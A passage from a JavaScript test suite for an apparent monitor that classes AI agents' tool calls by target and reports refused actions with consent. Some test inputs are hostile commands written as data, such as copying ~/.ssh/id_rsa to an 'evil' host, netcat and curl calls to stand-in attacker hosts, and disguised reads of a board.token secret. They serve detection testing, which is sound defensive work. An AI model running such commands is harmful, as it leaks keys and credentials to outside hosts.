  assert.deepEqual(got.map((e) => [e.rule, e.action]), [['sandbox', 'run']]);
});

test('#5683 r5: a rewritten file cannot lift the read budget', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-rw-'));
  const f = path.join(dir, 's.jsonl');
  fs.writeFileSync(f, 'a\n');
  const r = ae.readFrom(f, 10 * 1024 * 1024);   // an offset past the end: the file was rewritten
  fs.rmSync(dir, { recursive: true, force: true });
  assert.equal(r.read, 2, 'the bytes read were not what was actually read');
});

test('#5683 r5: a file that has not grown is not read again', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const real = fs.openSync;
  let opened = 0;
  fs.openSync = (...a) => { if (a[0] === s.file) opened += 1; return real(...a); };
  t.after(() => { fs.openSync = real; });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(opened, 0, 'an unchanged transcript was opened');
});

/* ---- review 6 ---- */

test('#5683 r6: a path with a space (Application Support), quoted, escaped or through $HOME, is classed whole', () => {
  const c = ctx({ boardRoot: '/Users/ann/Library/Application Support/Kosmos' });
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/Application\\ Support/Kosmos/board.token' }, c), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'cat "/Users/ann/Library/Application Support/Kosmos/x"' }, c), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'cat "$HOME/Library/Application Support/Kosmos/x"' }, c), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: "cat '${HOME}/Library/Application Support/Kosmos/x'" }, c), 'board-files');
});

test('#5683 r6: two long agent names that share their first 128 characters stay apart', () => {
  const a = ae.label('A'.repeat(130) + 'one');
  const b = ae.label('A'.repeat(130) + 'two');
  assert.notEqual(a, b);
  assert.ok([...a].length <= 128);
});

/* ---- review 7 ---- */

test('#5683 r7: a bare relative path in Bash (.claude/settings.json) is the agent\'s own settings', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat .claude/settings.json' }, ctx()), 'agent-config');
  assert.equal(ae.targetClass('Bash', { command: 'sed -i s/a/b/ .claude/settings.local.json' }, ctx()), 'agent-config');
  assert.equal(ae.targetClass('Bash', { command: 'echo https://example.com/x' }, ctx()), 'other', 'a URL was taken as a path');
});

test('#5683 r7: a blank or filler-only agent name is not sent (as the coordinator refuses it)', () => {
  assert.equal(ae.label('   '), null);
  assert.equal(ae.label('\u3164'), null);
  assert.equal(ae.label('Sc\u034fout'), null);
});

/* ---- review 8 ---- */

test('#5683 r8: /dev/null and the program run are not targets', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat ./notes.txt 2>/dev/null' }, ctx()), 'other');
  assert.equal(ae.targetClass('Bash', { command: '/usr/bin/env python3 x.py' }, ctx()), 'other');
  assert.equal(ae.targetClass('Bash', { command: 'ls; /bin/cat ~/x' }, ctx()), 'home', 'the program after a separator was taken as the target');
});

test('#5683 r8: on a Mac the board files are found whatever the case', { skip: process.platform !== 'darwin' }, () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/library/kosmos/board.token' }, ctx()), 'board-files');
});

test('#5683 r8: the agent read first rotates each tick', async (t) => {
  const { s, c } = await enrolled(t);
  const order = [];
  const src = { agents: () => ['A', 'B'], everyAgent: () => ['A', 'B'], transcriptDirsOf: (d) => ['/p' + d], guarded: () => true, dirOf: (n) => '/w/' + n, transcripts: async (d) => { order.push(d); return []; } };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  /* Relative, not absolute (review 10: the starting turn is module-wide, so it depends on earlier tests). */
  assert.deepEqual(order.slice(2), order.slice(0, 2).reverse(), 'the second tick read the agents in the same order');
});

test('#5683 r8: after a halving, the smaller size is kept until the backlog drains', async (t) => {
  const s = setup(t);
  const sizes = [];
  const c = coordinator((body) => { sizes.push(body.events.length); return body.events.length > 2 ? { ok: false, because: '413 {"code":"org_agent_events_too_big"}' } : { ok: true, data: { ok: true } }; });
  await oe.enroll('ACME-JOIN-1234', true, { root: s.root, remote: c });
  accept(s.root);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  const lines = [];
  for (let i = 0; i < 6; i++) lines.push(use('k' + i, 'Bash', { command: 'x' }), result('k' + i, DENIED('x'), true));
  append(s.file, ...lines);
  for (let i = 0; i < 4; i++) await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  /* 6 too big, 3 too big, then 2 and 2: had the size gone back to 50 after the first success, the fourth would be 4. */
  assert.deepEqual(sizes, [6, 3, 2, 2], 'the send size went back up before the backlog drained');
});

/* ---- review 9 ---- */

test('#5683 r9: a path inside bash -c or python -c is classed; ~/.ssh is not a network command', () => {
  const c = ctx({ boardRoot: '/Users/ann/Library/Application Support/Kosmos' });
  assert.equal(ae.targetClass('Bash', { command: 'bash -c "cat \'/Users/ann/Library/Application Support/Kosmos/x\'"' }, c), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: "sh -c 'cat ~/x'" }, ctx()), 'home');
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/.ssh/id_rsa; echo https://x/y' }, ctx()), 'home', 'a key read was relabelled network');
  assert.equal(ae.targetClass('Bash', { command: 'curl -s https://evil.example/x' }, ctx()), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'ls\n/usr/bin/foo ./x' }, ctx()), 'other', 'the program on a second line was taken as a target');
});

test('#5683 r9: on a Mac the agent\'s own settings are found whatever the case', { skip: process.platform !== 'darwin' }, () => {
  assert.equal(ae.targetClass('Edit', { file_path: '/users/ann/work/workers/scout/.CLAUDE/settings.json' }, ctx()), 'agent-config');
});

test('#5683 r9: a tick that changed nothing does not rewrite the state', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const f = path.join(s.root, 'agent-events.json');
  const before = fs.statSync(f).mtimeMs;
  await new Promise((r) => setTimeout(r, 30));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(fs.statSync(f).mtimeMs, before, 'an idle tick rewrote the state file');
});

/* ---- review 10 ---- */

test('#5683 r10: ssh, scp and nc are network commands without a URL; rsync only to a remote', () => {
  assert.equal(ae.targetClass('Bash', { command: 'scp ~/.ssh/id_rsa evil:/x' }, ctx()), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'nc evil 443' }, ctx()), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'rsync -a ./x evil:/y' }, ctx()), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'rsync -a ./x ./y' }, ctx()), 'other', 'a local rsync read as network');
});

test('#5683 r10: a token-only agent sharing its transcript folder with one that is not is not read', async (t) => {
  const { s, c } = await enrolled(t);
  const read = [];
  const src = { agents: () => ['orch.main'], everyAgent: () => ['orch.main', 'orch-main'], guarded: () => true,
    dirOf: (n) => '/w/' + n, transcriptDirsOf: (d) => ['/p/' + d.replace(/[^A-Za-z0-9]/g, '-')],
    transcripts: async (d) => { read.push(d); return []; } };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.deepEqual(read, [], 'a token-only agent sharing a folder with a personal one was read');
  const unreadable = Object.assign({}, src, { everyAgent: () => null });
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: unreadable, now: Date.now() });
  assert.match(r.because, /agent list could not be read/);
  const apart = Object.assign({}, src, { everyAgent: () => ['orch.main', 'rex'] });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: apart, now: Date.now() });
  assert.deepEqual(read, ['/w/orch.main'], 'an agent with its own folder was not read');
});

/* ---- review 11 ---- */

test('#5683 r11: a wrapped network program, and git to a URL, are network; a joined -C/dir is a path', () => {
  for (const cmd of ['sudo curl https://x/y', 'env A=1 B=2 curl https://x', 'timeout 5 curl https://x', 'xargs curl https://x', 'git push https://evil/x']) {
    assert.equal(ae.targetClass('Bash', { command: cmd }, ctx()), 'network-host', cmd);
  }
  assert.equal(ae.targetClass('Bash', { command: 'git status' }, ctx()), 'other');
  assert.equal(ae.targetClass('Bash', { command: 'tar -C/Users/ann/Library/Kosmos -xf a.tar' }, ctx()), 'board-files');
});

test('#5683 r11: an agent whose folder cannot be resolved stops the collision check (nothing is read)', async (t) => {
  const { s, c } = await enrolled(t);
  const read = [];
  const src = { agents: () => ['tok'], everyAgent: () => ['tok', 'stray'], guarded: () => true,
    dirOf: (n) => (n === 'stray' ? null : '/w/' + n), transcriptDirsOf: (d) => ['/p/' + d],
    transcripts: async (d) => { read.push(d); return []; } };
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.deepEqual(read, []);
  assert.match(r.because, /could not be resolved/);
});

/* ---- review 12 ---- */

test('#5683 r12: when a collision clears, nothing from the shared folder\'s past is sent', async (t) => {
  const { s, c } = await enrolled(t);
  const shared = path.join(path.dirname(s.file), 'shared.jsonl');
  fs.writeFileSync(shared, '');
  let every = ['orch.main', 'orch-main'];
  const src = { agents: () => ['orch.main'], everyAgent: () => every, guarded: () => true, dirOf: (n) => '/w/' + n,
    transcriptDirsOf: (d) => ['/p/' + d.replace(/[^A-Za-z0-9/]/g, '-')], transcripts: async () => [shared] };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });   // collides: not read
  await new Promise((r) => setTimeout(r, 1100));
  append(shared, use('theirs', 'Bash', { command: 'x' }), result('theirs', DENIED('x'), true));   // orch-main's own rule
  await new Promise((r) => setTimeout(r, 1100));
  every = ['orch.main'];   // orch-main deleted: the collision clears
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, "the other agent's refusal was sent once the collision cleared");
});

test('#5683 r12: sources without the agent-list check send nothing', async (t) => {
  const { s, c } = await enrolled(t);
  const partial = { agents: () => ['Scout'], dirOf: () => '/w/scout', transcripts: async () => [] };
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: partial, now: Date.now() });
  assert.match(r.because, /cannot be checked/);
});

/* ---- review 13 ---- */

test('#5683 r13: the guard\'s other roots and the app are the board\'s files; CLAUDE.md and the account config are config', () => {
  const c = ctx({ boardRoots: ['/Users/ann/Library/Application Support/Kosmos-other', '/Applications/Kosmos.app/engine'], configRoots: ['/Users/ann/.claude'] });
  assert.equal(ae.targetClass('Read', { file_path: '/Users/ann/Library/Application Support/Kosmos-other/board.token' }, c), 'board-files');
  assert.equal(ae.targetClass('Edit', { file_path: '/Applications/Kosmos.app/engine/server.js' }, c), 'board-files');
  assert.equal(ae.targetClass('Edit', { file_path: '/Users/ann/.claude/settings.json' }, c), 'agent-config');
  assert.equal(ae.targetClass('Write', { file_path: '/Users/ann/work/workers/scout/CLAUDE.md' }, c), 'agent-config');
  assert.equal(ae.targetClass('Write', { file_path: '/Users/ann/work/workers/scout/.mcp.json' }, c), 'agent-config');
});

/* ---- review 14 ---- */

test('#5683 r14: in a named world, the default world\'s base is not the board\'s files (the agent\'s folder is under it)', () => {
  const base = '/Users/ann/Library/Application Support/Kosmos';
  const c = ctx({ boardRoot: base + '/worlds/work/Kosmos', boardRoots: [base, base + '/worlds/work/Kosmos'],
    agentDir: base + '/worlds/work/workers/scout', otherAgentDirs: [base + '/worlds/work/workers/rex'] });
  assert.equal(ae.targetClass('Bash', { command: 'cat ./notes.txt' }, c), 'other', "an agent's own file read as the board's");
  assert.equal(ae.targetClass('Edit', { file_path: base + '/worlds/work/workers/scout/.claude/settings.json' }, c), 'agent-config');
  assert.equal(ae.targetClass('Read', { file_path: base + '/worlds/work/workers/rex/x' }, c), 'other-agent');
  assert.equal(ae.targetClass('Read', { file_path: base + '/worlds/work/Kosmos/board.token' }, c), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'FOO=1 curl https://x' }, ctx()), 'network-host');
});

/* ---- review 15 ---- */

test('#5683 r15: in a named world, the default world\'s own board files are still the board\'s', () => {
  const base = '/Users/ann/Library/Application Support/Kosmos';
  const c = ctx({ boardRoot: base + '/worlds/work/Kosmos', boardRoots: [base, base + '/worlds/work/Kosmos'],
    agentDir: base + '/worlds/work/workers/scout', otherAgentDirs: [] });
  assert.equal(ae.targetClass('Bash', { command: 'cat "' + base + '/board.token"' }, c), 'board-files');
  assert.equal(ae.targetClass('Read', { file_path: base + '/worlds.json' }, c), 'board-files');
  assert.equal(ae.targetClass('Read', { file_path: base + '/worlds/work/workers/scout/notes.txt' }, c), 'other', "the agent's own file");
});

/* ---- review 16 ---- */

test('#5683 r16: a listed agent whose guard is not in force is not read', async (t) => {
  const { s, c } = await enrolled(t);
  const read = [];
  const src = Object.assign({}, s.sources(), { guarded: () => false, transcripts: async (d) => { read.push(d); return []; } });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.deepEqual(read, [], "an unguarded agent's transcripts were read (its refusals are the person's own)");
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: Object.assign({}, src, { guarded: () => true }), now: Date.now() });
  assert.ok(read.length > 0, 'the stub setup never reads at all, so the empty read proved nothing');
});

test('#5683 r16: a sandbox refusal counts only on macOS; a tool named like an object key is a run', () => {
  const lines = use('e1', 'Bash', { command: 'x' }) + '\n' + result('e1', 'x: Operation not permitted', true);
  assert.deepEqual(ae.scanText(lines, new Map(), ctx({ platform: 'linux' })), []);
  assert.equal(ae.scanText(lines, new Map(), ctx({ platform: 'darwin' })).length, 1);
  const odd = ae.scanText(result('e2', 'Permission to use constructor has been denied.', true), new Map(), ctx());
  assert.equal(odd[0].action, 'run');
});

/* ---- review 17 ---- */

test('#5683 r17: the board\'s own guard check agrees with what the guard writes', async (t) => {
  const sa = require('./setup-assistant');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-guard-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const r = sa.guardTokenOnlyFolder(dir, 'Scout', { runner: 'claude', platform: 'darwin' });
  /* Review 18: on a Mac the guard must be writable here, or the only test of the real check would skip and never fail. */
  if (!r.ok && process.platform !== 'darwin') { t.skip('the guard could not be written off macOS: ' + r.because); return; }
  assert.ok(r.ok, 'the guard could not be written: ' + r.because);
  const src = ae._defaultSources();
  assert.equal(src.guarded(dir, new Map()), true, 'a folder the guard just wrote was read as unguarded');
  const other = fs.mkdtempSync(path.join(os.tmpdir(), 'agentevents-5683-noguard-'));
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  assert.equal(src.guarded(other, new Map()), false, 'a folder with no guard was read as guarded');
  /* A settings file that is there but does not keep the token out is not a guard either. */
  fs.mkdirSync(path.join(other, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(other, '.claude', 'settings.json'), JSON.stringify({ permissions: { deny: ['Bash(rm:*)'] } }));
  assert.equal(src.guarded(other, new Map()), false, 'a settings file without the token rules was read as a guard');
});

test('#5683 r17: words lost while enrolled (no 409 here) mark the state, so the gap is never sent', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const hash = oe.readEnrollment({ root: s.root }).consentHash;
  await oe.consentWithdrawn({ root: s.root }, hash);   // e.g. by the rollup
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  assert.equal(JSON.parse(fs.readFileSync(path.join(s.root, 'agent-events.json'), 'utf8')).withdrawn, true);
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('gap', 'Bash', { command: 'x' }), result('gap', DENIED('x'), true));   // while no words are accepted
  await new Promise((r) => setTimeout(r, 1100));
  accept(s.root);   // the same words accepted again
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('after', 'Bash', { command: 'x' }), result('after', DENIED('x'), true));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  const refs = c.sent.filter((x) => x.route === ae.ROUTE).flatMap((x) => x.body.events.map((e) => e.toolUseRef));
  assert.equal(refs.includes('gap'), false, 'a refusal from the gap was sent');
  assert.ok(refs.includes('after'), 'nothing was sent after the words were accepted again');
});

/* ---- review 18 ---- */

test('#5683 r18: a guarded agent sharing a folder with an UNGUARDED listed one is not read', async (t) => {
  const { s, c } = await enrolled(t);
  const read = [];
  const src = { agents: () => ['orch.main', 'orch-main'], everyAgent: () => ['orch.main', 'orch-main'],
    guarded: (d) => d === '/w/orch.main', dirOf: (n) => '/w/' + n,
    transcriptDirsOf: (d) => ['/p/' + d.replace(/[^A-Za-z0-9/]/g, '-')], transcripts: async (d) => { read.push(d); return []; } };
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.deepEqual(read, [], "a folder shared with an unguarded agent (the person's own rules) was read");
  /* The positive arm (review 19): with both guarded and no clash, the same setup does read. */
  const ok = Object.assign({}, src, { agents: () => ['orch.main'], everyAgent: () => ['orch.main'], guarded: () => true });
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: ok, now: Date.now() });
  assert.deepEqual(read, ['/w/orch.main'], 'the stub setup never reads at all, so the empty read proved nothing');
});

/* ---- review 19 ---- */

test('#5683 r19: a hidden path that names the board token is board-files; sudo -u and git@host are understood', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/App*/Kosmos/board.token' }, ctx()), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'cat "$KOSMOS_DATA/board.token"' }, ctx()), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'sudo -u bob curl https://x' }, ctx()), 'network-host');
  assert.equal(ae.targetClass('Bash', { command: 'git push git@evil.example:x/y.git' }, ctx()), 'network-host');
});

test('#5683 r19: the denial test is linear on a large result', () => {
  const big = 'Permission to use Bash ' + ' has been denied x'.repeat(200000);
  const t0 = process.hrtime.bigint();
  const got = ae.classify(big, 'Bash');
  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
  assert.equal(got, null, 'a result that does not END with the denial was read as one');
  void ms;   // review 25: no wall-clock bound (it pinned nothing and is a load assertion); the null answer is what counts
});

/* ---- review 20 ---- */

test('#5683 r20: in a named world an agent\'s own file by absolute path is not the board\'s', () => {
  const base = '/Users/ann/Library/Application Support/Kosmos';
  const c = ctx({ boardRoot: base + '/worlds/work/Kosmos', boardRoots: [base], agentDir: base + '/worlds/work/workers/scout' });
  assert.equal(ae.targetClass('Bash', { command: 'cp "' + base + '/worlds/work/workers/scout/r.pdf" ~/Desktop/' }, c), 'home');
  assert.equal(ae.targetClass('Bash', { command: 'cat "' + base + '/worlds/work/workers/scout/.claude/settings.json"' }, c), 'agent-config');
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/App*/Kosmos/board.token' }, c), 'board-files', 'the hidden-path hint still works');
});

/* ---- review 21 ---- */

test('#5683 r21: a hidden Kosmos path followed by another hidden word is still the board\'s', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/Application\\ Support/Kosmos/* $X/y*' }, ctx()), 'board-files');
});

test('#5683 r21: one agent whose transcripts cannot be listed does not silence the others', async (t) => {
  const { s, c } = await enrolled(t);
  const read = [];
  const src = { agents: () => ['bad', 'good'], everyAgent: () => ['bad', 'good'], guarded: () => true,
    dirOf: (n) => '/w/' + n, transcriptDirsOf: (d) => ['/p' + d],
    transcripts: async (d) => { if (d === '/w/bad') throw new Error('unreadable'); read.push(d); return []; } };
  const r = await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: src, now: Date.now() });
  assert.deepEqual(read, ['/w/good'], 'the other agent was not read');
  assert.equal(r.because, null);
});

/* ---- review 23 ---- */

test('#5683 r23: a failed state write keeps the calls, so the re-read is classed with its call', async (t) => {
  const { s, c } = await enrolled(t);
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('wf', 'Bash', { command: 'touch /etc/x' }));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // the call: written
  append(s.file, result('wf', 'touch: /etc/x: Operation not permitted', true));
  /* The result lands in a tick whose state write fails (the state folder unwritable), so that tick must not consume the call. */
  fs.chmodSync(s.root, 0o500);
  try { await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() }); } finally { fs.chmodSync(s.root, 0o700); }
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: Date.now() });   // the re-read
  const ev = c.sent.filter((x) => x.route === ae.ROUTE).flatMap((x) => x.body.events);
  assert.deepEqual(ev.map((e) => [e.toolUseRef, e.targetClass]), [['wf', 'system']], 'the call was lost with the failed write');
});

/* ---- review 24 ---- */

test('#5683 r24: a guard unconfirmed for longer than two ticks counts from now (it may have lapsed unseen)', async (t) => {
  const { s, c } = await enrolled(t);
  const T0 = Date.now();
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: T0 });
  await new Promise((r) => setTimeout(r, 1100));
  append(s.file, use('down', 'Bash', { command: 'x' }), result('down', DENIED('x'), true));   // during the gap
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: T0 + 30 * 60e3 });   // half an hour later
  assert.equal(c.sent.some((x) => x.route === ae.ROUTE), false, 'a refusal from the unchecked gap was sent');
});

test('#5683 r24: a hidden word inside the agent\'s own folder is not the board\'s', () => {
  assert.equal(ae.targetClass('Bash', { command: 'cp ./maps/*/worlds.json /etc/' }, ctx()), 'system');
  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/App*/Kosmos/board.token' }, ctx()), 'board-files', 'the hint still works outside it');
});

/* ---- review 25 ---- */

test('#5683 r25: a board token read hidden past 4096 characters is still the board\'s; $PWD is the agent\'s folder', () => {
  const pad = 'echo ' + 'x'.repeat(5000) + '; ';
  assert.equal(ae.targetClass('Bash', { command: pad + 'cat ~/Library/Application\\ Support/Kosmos/board.token' }, ctx()), 'board-files');
  assert.equal(ae.targetClass('Bash', { command: 'rm $PWD/x*/worlds.json' }, ctx()), 'other', "the agent's own file read as the board's");
});

test('#5683 r25: ticks five minutes apart do not rewrite the state each time for the guard confirmation', async (t) => {
  const { s, c } = await enrolled(t);
  const T0 = Date.now();
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: T0 });
  const f = path.join(s.root, 'agent-events.json');
  const m1 = fs.statSync(f).mtimeMs;
  await new Promise((r) => setTimeout(r, 30));
  await ae.tick({ platform: 'darwin', root: s.root, remote: c, sources: s.sources(), now: T0 + 5 * 60e3 });
  assert.equal(fs.statSync(f).mtimeMs, m1, 'a tick five minutes later rewrote the state for the confirmation alone');
});

